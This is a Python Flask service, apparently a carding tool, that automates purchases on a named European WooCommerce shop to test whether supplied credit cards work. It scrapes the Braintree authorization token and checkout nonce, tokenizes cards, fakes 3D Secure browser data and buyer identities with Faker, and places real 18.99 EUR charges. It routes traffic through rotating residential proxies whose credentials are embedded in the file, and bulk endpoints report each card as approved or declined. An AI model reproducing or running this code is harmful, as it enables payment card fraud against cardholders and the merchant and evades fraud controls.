import asyncio
import datetime
import re
import uuid
import random
import base64
import json
from typing import List, Dict, Optional, Tuple
import httpx
from bs4 import BeautifulSoup, Tag
from fake_useragent import FakeUserAgent
from faker import Faker
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time

app = Flask(__name__)
CORS(app)

# Sistema de proxys rotativos
class ProxyRotator:
    def __init__(self, proxy_list: List[str]):
        self.proxy_list = proxy_list
        self.current_index = 0
        self.failed_proxies = set()
        self.lock = threading.Lock()
    
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if len(self.failed_proxies) >= len(self.proxy_list):
                self.failed_proxies.clear()
            
            attempts = 0
            while attempts < len(self.proxy_list):
                proxy = self.proxy_list[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxy_list)
                
                if proxy not in self.failed_proxies:
                    return {
                        'http://': proxy,
                        'https://': proxy
                    }
                
                attempts += 1
            
            return None
    
    def mark_proxy_failed(self, proxy_dict: Dict[str, str]):
        if proxy_dict:
            with self.lock:
                proxy_url = proxy_dict.get('https://', '')
                self.failed_proxies.add(proxy_url)
    
    def mark_proxy_success(self, proxy_dict: Dict[str, str]):
        if proxy_dict:
            with self.lock:
                proxy_url = proxy_dict.get('https://', '')
                self.failed_proxies.discard(proxy_url)

# Configuración de proxys
PROXY_LIST = [
    "socks5://vUdAfD9RPXV8j2dX-res-any:MtsnNTSFWKsZoxJ4@resi.legionproxy.io:9595",
]

proxy_rotator = ProxyRotator(PROXY_LIST)

def parse_card(card: str) -> Tuple[str, str, str, str]:
    try:
        card_number, exp_month, exp_year, cvv = re.findall(r"\d+", card)[:4]
        return card_number, exp_month, exp_year, cvv
    except IndexError:
        raise IndexError(
            "Card format is incorrect. Expected format: card_number, exp_month, exp_year, cvv"
        )

def extract_braintree_token(html_content: str) -> Optional[str]:
    """Extrae el token de Braintree del HTML y lo decodifica"""
    try:
        pattern = r'var wc_braintree_client_token = \["([^"]+)"\];'
        match = re.search(pattern, html_content)
        
        if not match:
            print("[ERROR] No se encontró el token de Braintree en el HTML")
            return None
        
        encoded_token = match.group(1)
        
        try:
            decoded_bytes = base64.b64decode(encoded_token)
            decoded_token = decoded_bytes.decode('utf-8')
            token_data = json.loads(decoded_token)
            auth_fingerprint = token_data.get('authorizationFingerprint')
            
            if auth_fingerprint:
                print(f"[INFO] Token de autorización extraído exitosamente")
                return auth_fingerprint
            else:
                print("[ERROR] No se encontró authorizationFingerprint en el token decodificado")
                return None
                
        except (base64.binascii.Error, json.JSONDecodeError, UnicodeDecodeError) as e:
            print(f"[ERROR] Error al decodificar el token: {e}")
            return None
            
    except Exception as e:
        print(f"[ERROR] Error al extraer el token de Braintree: {e}")
        return None

async def test_proxy_connection(proxy_config: Dict[str, str]) -> bool:
    """Prueba la conexión del proxy"""
    try:
        async with httpx.AsyncClient(
            proxies=proxy_config,
            timeout=30.0,
            verify=False
        ) as client:
            resp = await client.get("https://httpbin.org/ip")
            if resp.status_code == 200:
                ip_data = resp.json()
                print(f"[INFO] Proxy working - IP: {ip_data.get('origin', 'unknown')}")
                return True
            else:
                print(f"[ERROR] Proxy test failed - Status: {resp.status_code}")
                return False
    except Exception as e:
        print(f"[ERROR] Proxy test failed: {e}")
        return False

async def get_ip_address(proxy_config: Dict[str, str] = None) -> str:
    try:
        async with httpx.AsyncClient(
            proxies=proxy_config if proxy_config else None,
            timeout=30.0,
            verify=False
        ) as client:
            resp = await client.get(
                "https://api.ipify.org?format=json",
                headers={
                    "accept": "application/json",
                    "user-agent": FakeUserAgent(os=["Windows"]).chrome,
                }
            )
            if resp.status_code == 200:
                ip = resp.json().get("ip", "")
                print(f"[INFO] Current IP: {ip}")
                return ip
            else:
                print(f"[ERROR] Failed to get IP address: {resp.status_code}")
                return ""
    except Exception as e:
        print(f"[ERROR] Failed to get IP address: {e}")
        return ""

async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tuple[str, str, str, str]]:
    try:
        card_number, exp_month, exp_year, cvv = parse_card(card)
        
        # Headers realistas
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        
        # Datos fake US
        fake_us = Faker(locale="en_US")
        first_name = fake_us.first_name()
        last_name = fake_us.last_name()
        street_address = fake_us.street_address()
        city = fake_us.city()
        zip_code = fake_us.zipcode()
        phone = fake_us.numerify("###-###-####")
        email = fake_us.email()
        
        # Datos fake ES
        fake_es = Faker(locale="es_ES")
        first_name_es = fake_es.first_name()
        last_name_es = fake_es.last_name()
        street_address_es = fake_es.street_address()
        city_es = "Barcelona"
        zip_code_es = fake_es.numerify("08###")
        
        req_num = 0
        session_id = str(uuid.uuid4())
        reference_id = str(uuid.uuid4())
        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Sistema de proxys
        proxy_config = None
        if use_proxy:
            proxy_config = proxy_rotator.get_next_proxy()
            if proxy_config:
                print(f"[INFO] Using proxy: {list(proxy_config.values())[0]}")
                proxy_works = await test_proxy_connection(proxy_config)
                if not proxy_works:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                    proxy_config = None
                    print("[WARNING] Proxy failed test, continuing without proxy")
            else:
                print("[WARNING] No proxy available, continuing without proxy")
        
        ip_address = await get_ip_address(proxy_config)
        if not ip_address:
            print("[ERROR] Could not retrieve IP address. Continuing anyway...")
            ip_address = "127.0.0.1"  # Fallback IP
        
        # Configurar cliente HTTP
        client_config = {
            "timeout": 60.0,
            "verify": False,
            "follow_redirects": True
        }
        if proxy_config:
            client_config["proxies"] = proxy_config
        
        async with httpx.AsyncClient(**client_config) as client:
            # REQ 1: POST to admin-ajax.php
            req_num = 1
            print(f"[REQ {req_num}] Adding to cart...")
            
            resp = await client.post(
                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
                headers={
                    **headers,
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://nammanmuay.eu",
                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "quantity": "1",
                    "add-to-cart": "623",
                    "action": "ouwoo_ajax_add_to_cart",
                    "variation_id": "0",
                }
            )
            
            if resp.status_code != 200:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return None
            
            print(f"[REQ {req_num}] Success - Added to cart")
            
            # REQ 2: GET to checkout
            req_num = 2
            print(f"[REQ {req_num}] Getting checkout page...")
            
            resp = await client.get(
                "https://nammanmuay.eu/checkout/",
                headers={
                    **headers,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                    "upgrade-insecure-requests": "1",
                }
            )
            
            if resp.status_code != 200:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return None
            
            soup = BeautifulSoup(resp.text, "html.parser")
            
            # Extraer checkout nonce
            input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
            if input_tag and isinstance(input_tag, Tag):
                checkout_nonce = input_tag.get("value")
                print(f"[REQ {req_num}] Checkout nonce extracted")
            else:
                print(f"[REQ {req_num} ERROR] Error: 'checkout_nonce' not found.")
                return None
            
            # Extraer y decodificar token de Braintree
            auth_fingerprint = extract_braintree_token(resp.text)
            if not auth_fingerprint:
                print(f"[REQ {req_num} ERROR] Could not extract Braintree authorization fingerprint")
                return None
            
            print(f"[INFO] Using authorization fingerprint: {auth_fingerprint[:50]}...")
            
            # REQ 3: POST to graphql
            req_num = 3
            print(f"[REQ {req_num}] Tokenizing credit card...")
            
            resp = await client.post(
                "https://payments.braintree-api.com/graphql",
                headers={
                    **headers,
                    "authorization": f"Bearer {auth_fingerprint}",
                    "braintree-version": "2018-05-10",
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                },
                json={
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": session_id,
                    },
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_number,
                                "expirationMonth": exp_month.zfill(2),
                                "expirationYear": (
                                    "20" + exp_year if len(exp_year) == 2 else exp_year
                                ),
                                "cvv": cvv,
                                "billingAddress": {
                                    "postalCode": zip_code,
                                    "streetAddress": street_address,
                                },
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                }
            )
            
            if resp.status_code != 200:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                print(f"[REQ {req_num} ERROR] Response: {resp.text[:200]}")
                return None
            
            resp_json = resp.json()
            
            # Verificar si hay errores en la respuesta
            if 'errors' in resp_json:
                error_msg = resp_json['errors'][0].get('message', 'Unknown GraphQL error')
                print(f"[REQ {req_num} ERROR] GraphQL Error: {error_msg}")
                return "declined", error_msg, "unknown", "unknown"
            
            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
            if not token:
                print(f"[REQ {req_num} ERROR] No token received from Braintree")
                return None
            
            print(f"[REQ {req_num}] Success - Token received: {token[:20]}...")
            
            # REQ 4: POST to 3D Secure lookup
            req_num = 4
            print(f"[REQ {req_num}] 3D Secure lookup...")
            
            resp = await client.post(
                f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
                headers={
                    **headers,
                    "content-type": "application/json",
                    "origin": "https://nammanmuay.eu",
                    "referer": "https://nammanmuay.eu/",
                },
                json={
                    "amount": "18.99",
                    "browserColorDepth": 24,
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-US",
                    "browserScreenHeight": 1080,
                    "browserScreenWidth": 1920,
                    "browserTimeZone": 240,
                    "deviceChannel": "Browser",
                    "additionalInfo": {
                        "shippingGivenName": first_name,
                        "shippingSurname": last_name,
                        "ipAddress": ip_address,
                        "billingLine1": street_address,
                        "billingLine2": street_address,
                        "billingCity": city,
                        "billingState": "",
                        "billingPostalCode": zip_code,
                        "billingCountryCode": "US",
                        "billingPhoneNumber": phone,
                        "billingGivenName": first_name_es,
                        "billingSurname": last_name_es,
                        "shippingLine1": street_address_es,
                        "shippingLine2": street_address_es,
                        "shippingCity": city_es,
                        "shippingState": "",
                        "shippingPostalCode": zip_code_es,
                        "shippingCountryCode": "ES",
                        "email": email,
                    },
                    "bin": card_number[:6],
                    "dfReferenceId": f"0_{reference_id}",
                    "clientMetadata": {
                        "requestedThreeDSecureVersion": "2",
                        "sdkVersion": "web/3.123.1",
                        "cardinalDeviceDataCollectionTimeElapsed": 1,
                        "issuerDeviceDataCollectionTimeElapsed": 569,
                        "issuerDeviceDataCollectionResult": True,
                    },
                    "authorizationFingerprint": auth_fingerprint,
                    "braintreeLibraryVersion": "braintree/web/3.123.1",
                    "_meta": {
                        "merchantAppId": "nammanmuay.eu",
                        "platform": "web",
                        "sdkVersion": "3.123.1",
                        "source": "client",
                        "integration": "custom",
                        "integrationType": "custom",
                        "sessionId": session_id,
                    },
                }
            )
            
            if resp.status_code != 200:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return None
            
            resp_json = resp.json()
            
            # Verificar si hay errores
            if 'error' in resp_json:
                error_msg = resp_json['error'].get('message', 'Unknown 3DS error')
                print(f"[REQ {req_num} ERROR] 3DS Error: {error_msg}")
                return "declined", error_msg, "unknown", "unknown"
            
            nonce = resp_json.get("paymentMethod", {}).get("nonce")
            status = resp_json.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("status")
            enrolled = resp_json.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("enrolled")
            
            if not nonce:
                print(f"[REQ {req_num} ERROR] No nonce received from 3DS lookup")
                return None
            
            print(f"[INFO] 3DS Status: {status}, Enrolled: {enrolled}")
            
            # REQ 5: POST to get cart id
            req_num = 5
            print(f"[REQ {req_num}] Getting cart ID...")
            
            resp = await client.post(
                "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
                headers={
                    **headers,
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://nammanmuay.eu",
                    "referer": "https://nammanmuay.eu/checkout/",
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "email": email,
                    "action": "bwfan_insert_abandoned_cart",
                    "checkout_fields_data[shipping_same_as_billing]": "1",
                    "checkout_fields_data[shipping_postcode]": zip_code_es,
                    "checkout_fields_data[shipping_state]": "",
                    "checkout_fields_data[shipping_city]": city_es,
                    "checkout_fields_data[shipping_address_2]": street_address_es,
                    "checkout_fields_data[shipping_address_1]": street_address_es,
                    "checkout_fields_data[shipping_country]": "ES",
                    "checkout_fields_data[shipping_last_name]": last_name_es,
                    "checkout_fields_data[shipping_first_name]": first_name_es,
                    "checkout_fields_data[billing_postcode]": zip_code,
                    "checkout_fields_data[billing_state]": "",
                    "checkout_fields_data[billing_city]": city,
                    "checkout_fields_data[billing_address_2]": street_address,
                    "checkout_fields_data[billing_address_1]": street_address,
                    "checkout_fields_data[billing_country]": "US",
                    "checkout_fields_data[billing_phone]": phone,
                    "checkout_fields_data[billing_last_name]": last_name,
                    "checkout_fields_data[billing_first_name]": first_name,
                    "checkout_fields_data[ws_opt_in]": "1",
                    "last_edit_field": "billing_country",
                    "current_step": "single_step",
                    "current_page_id": "54599",
                    "timezone": "America/New_York",
                    "aerocheckout_page_id": "54599",
                    "pushengage_token": "",
                    "_wpnonce": "a8f2caf831",
                }
            )
            
            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return None
            
            try:
                cart_response = resp.json()
                cart_id = cart_response.get("id")
            except:
                print(f"[REQ {req_num} ERROR] Invalid JSON response for cart")
                return None
            
            if not cart_id:
                print(f"[REQ {req_num} ERROR] No cart ID received")
                return None
            
            print(f"[REQ {req_num}] Success - Cart ID: {cart_id}")
            
            # REQ 6: POST to checkout final
            req_num = 6
            print(f"[REQ {req_num}] Final checkout...")
            
            # Crear JSON data correctamente
            phone_field_data = {
                "billing": {"code": "1", "number": phone, "hidden": "no"},
                "shipping": {"code": "", "number": "", "hidden": ""}
            }
            device_data = {"correlation_id": session_id}
            
            checkout_data = [
                ("_wfacp_post_id", "54599"),
                ("wfacp_cart_hash", ""),
                ("wfacp_has_active_multi_checkout", ""),
                ("wfacp_source", "https://nammanmuay.eu/checkouts/checkout/"),
                ("product_switcher_need_refresh", "1"),
                ("wfacp_cart_contains_subscription", "0"),
                ("wfacp_exchange_keys", '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}'),
                ("wfacp_input_hidden_data", "{}"),
                ("wfacp_input_phone_field", json.dumps(phone_field_data)),
                ("wfacp_timezone", "America/New_York"),
                ("wc_order_attribution_source_type", "typein"),
                ("wc_order_attribution_referrer", "https://nammanmuay.eu/namman-muay-cream-100g/"),
                ("wc_order_attribution_utm_campaign", "(none)"),
                ("wc_order_attribution_utm_source", "(direct)"),
                ("wc_order_attribution_utm_medium", "(none)"),
                ("wc_order_attribution_utm_content", "(none)"),
                ("wc_order_attribution_utm_id", "(none)"),
                ("wc_order_attribution_utm_term", "(none)"),
                ("wc_order_attribution_utm_source_platform", ""),
                ("wc_order_attribution_utm_creative_format", ""),
                ("wc_order_attribution_utm_marketing_tactic", ""),
                ("wc_order_attribution_session_entry", "https://nammanmuay.eu/checkout/"),
                ("wc_order_attribution_session_start_time", start_time),
                ("wc_order_attribution_session_pages", "2"),
                ("wc_order_attribution_session_count", "1"),
                ("wc_order_attribution_user_agent", headers["user-agent"]),
                ("wfacp_billing_address_present", "yes"),
                ("wfob_input_hidden_data", "{}"),
                ("wfob_input_bump_shown_ids", "54600"),
                ("wfob_input_bump_global_data", ""),
                ("billing_email", email),
                ("bwfan_cart_id", str(cart_id)),
                ("billing_first_name", first_name),
                ("billing_last_name", last_name),
                ("billing_address_1", street_address),
                ("billing_address_2", street_address),
                ("billing_country", "US"),
                ("billing_city", city),
                ("billing_postcode", zip_code),
                ("billing_phone", phone),
                ("shipping_same_as_billing", "1"),
                ("shipping_first_name", first_name_es),
                ("shipping_last_name", last_name_es),
                ("shipping_address_1", street_address_es),
                ("shipping_address_2", street_address_es),
                ("shipping_country", "ES"),
                ("shipping_city", city_es),
                ("shipping_postcode", zip_code_es),
                ("wfacp_coupon_field", ""),
                ("shipping_method[0]", "flat_rate:53"),
                ("payment_method", "braintree_cc"),
                ("braintree_cc_nonce_key", nonce),
                ("braintree_cc_device_data", json.dumps(device_data)),
                ("braintree_cc_3ds_nonce_key", ""),
                ("braintree_cc_config_data", '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/vb72b9cm2v6gskzz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/vb72b9cm2v6gskzz"},"merchantId":"vb72b9cm2v6gskzz","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"paypalEnabled":true}'),
                ("terms", "on"),
                ("terms-field", "1"),
                ("bwfan_user_consent", "1"),
                ("woocommerce-process-checkout-nonce", checkout_nonce),
                ("_wp_http_referer", "/?wc-ajax=update_order_review&wfacp_id=54599&wfacp_is_checkout_override=yes"),
                ("billing_state", ""),
                ("shipping_state", ""),
                ("ship_to_different_address", "1"),
            ]
            
            resp = await client.post(
                "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
                headers={
                    **headers,
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://nammanmuay.eu",
                    "referer": "https://nammanmuay.eu/checkout/",
                    "x-requested-with": "XMLHttpRequest",
                },
                data=checkout_data
            )
            
            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return None
            
            # Si llegamos aquí sin errores, marcar proxy como exitoso
            if proxy_config:
                proxy_rotator.mark_proxy_success(proxy_config)
            
            # Procesar respuesta final
            try:
                resp_json = resp.json()
                if resp_json.get("result") == "success":
                    print(f"[REQ {req_num}] SUCCESS - Payment approved!")
                    return "approved", "Charged 18,99€", status, enrolled
                
                # Extraer mensaje de error
                message = resp_json.get("messages", "")
                if message:
                    soup = BeautifulSoup(message, "html.parser")
                    text = soup.get_text()
                    match = re.search(r"Reason:\s*(.*)", text)
                    error_reason = match.group(1) if match else text.strip() or "Unknown error"
                else:
                    error_reason = "Payment declined"
                
                print(f"[REQ {req_num}] DECLINED - {error_reason}")
                return "declined", error_reason, status, enrolled
                
            except json.JSONDecodeError:
                soup = BeautifulSoup(resp.text, "html.parser")
                error_text = soup.get_text().strip()
                return "declined", error_text[:200] if error_text else "Unknown error", status, enrolled
            
    except Exception as e:
        if proxy_config:
            proxy_rotator.mark_proxy_failed(proxy_config)
        print(f"[ERROR] Request {req_num} failed: {e}")
        return None

# Rutas de la API
@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data:
            return jsonify({
                'error': 'Missing card data',
                'message': 'Please provide card in the request body'
            }), 400
        
        card = data['card']
        use_proxy = data.get('use_proxy', True)
        
        print(f"[API] Processing card: {card} with proxy: {use_proxy}")
        
        # Ejecutar verificación
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            result = loop.run_until_complete(braintree_18_99_eur(card, use_proxy))
        finally:
            loop.close()
        
        if result is None:
            return jsonify({
                'error': 'Verification failed',
                'message': 'Could not complete card verification'
            }), 500
        
        status, message, tds_status, enrolled = result
        
        return jsonify({
            'card': card,
            'status': status.upper(),
            'message': message,
            'tds_status': tds_status,
            'tds_enrolled': enrolled,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"[API ERROR] {str(e)}")
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/check-cards', methods=['POST'])
def check_multiple_cards():
    try:
        data = request.get_json()
        
        if not data or 'cards' not in data:
            return jsonify({
                'error': 'Missing cards data',
                'message': 'Please provide cards array in the request body'
            }), 400
        
        cards = data['cards']
        use_proxy = data.get('use_proxy', True)
        
        if not isinstance(cards, list) or len(cards) == 0:
            return jsonify({
                'error': 'Invalid cards data',
                'message': 'Cards must be a non-empty array'
            }), 400
        
        results = []
        
        for i, card in enumerate(cards):
            print(f"[API] Processing card {i+1}/{len(cards)}: {card}")
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                result = loop.run_until_complete(braintree_18_99_eur(card, use_proxy))
            finally:
                loop.close()
            
            if result is None:
                card_result = {
                    'card': card,
                    'status': 'ERROR',
                    'message': 'Verification failed',
                    'tds_status': 'unknown',
                    'tds_enrolled': 'unknown',
                    'timestamp': datetime.datetime.now().isoformat()
                }
            else:
                status, message, tds_status, enrolled = result
                card_result = {
                    'card': card,
                    'status': status.upper(),
                    'message': message,
                    'tds_status': tds_status,
                    'tds_enrolled': enrolled,
                    'timestamp': datetime.datetime.now().isoformat()
                }
            
            results.append(card_result)
            
            # Pausa entre requests
            if i < len(cards) - 1:  # No pausar después de la última tarjeta
                time.sleep(2)
        
        return jsonify({
            'total_cards': len(cards),
            'results': results,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"[API ERROR] {str(e)}")
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/proxy-status', methods=['GET'])
def proxy_status():
    return jsonify({
        'total_proxies': len(proxy_rotator.proxy_list),
        'failed_proxies': len(proxy_rotator.failed_proxies),
        'active_proxies': len(proxy_rotator.proxy_list) - len(proxy_rotator.failed_proxies),
        'current_index': proxy_rotator.current_index
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.now().isoformat(),
        'proxy_system': 'active'
    })

if __name__ == '__main__':
    print("[INFO] Starting Braintree Card Checker API...")
    print(f"[INFO] Loaded {len(PROXY_LIST)} proxies")
    print("[INFO] Available endpoints:")
    print("  - GET  /api/health")
    print("  - GET  /api/proxy-status") 
    print("  - POST /api/check-card")
    print("  - POST /api/check-cards")
    app.run(host='0.0.0.0', port=5000, debug=False)
